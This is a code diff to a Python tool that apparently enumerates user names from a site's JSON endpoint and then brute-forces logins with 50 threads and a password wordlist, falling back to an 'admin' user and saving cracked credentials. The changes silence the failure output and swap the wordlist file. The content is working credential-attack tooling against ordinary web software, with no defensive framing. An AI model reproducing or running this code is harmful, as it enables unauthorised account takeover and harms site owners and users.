@@ -11,10 +11,9 @@ def fetching_user(url):
 			for x in json.loads(req):
 				user_list.append(x['slug'])
 		except ValueError:
-			print(colored("[{}][!] Json {} error. !\n".format(local_time(),url), "red"))
-		
+			pass
 	except Exception as e:
-		print(colored("[{}][!] Error! !".format(local_time()), "red"))
+		pass
 	return user_list
 def check_array(arr): 
     if len(arr) == 0: 
@@ -38,7 +37,7 @@ def exploit(url, user_url, list_password):
 			print(colored("[{}][+] User: [{}] Pass: [{}] Url: {} ".format(local_time(),user_url,list_password,url), "green"))
 			save("User [{}] Pass [{}] Url {}".format(user_url,list_password,url))
 		else:
-			print(colored("[{}][-] Url: {} user: {} pass: {}".format(local_time(),url,user_url, list_password), "red"))
+			pass
 	except requests.exceptions.ConnectionError as e:
 		pass
 	except Exception as e:
@@ -53,8 +52,7 @@ def brute_url(url):
 		else:
 			print(colored('[{}][+] User: [admin]'.format(local_time()), "green"))
 			user.append("admin")
-
-		password = "pass1.txt"
+		password = "passa.txt"
 		with ThreadPoolExecutor(max_workers=50) as executor:
 			for user_url in user:
 				with open(password, "r") as password_list:
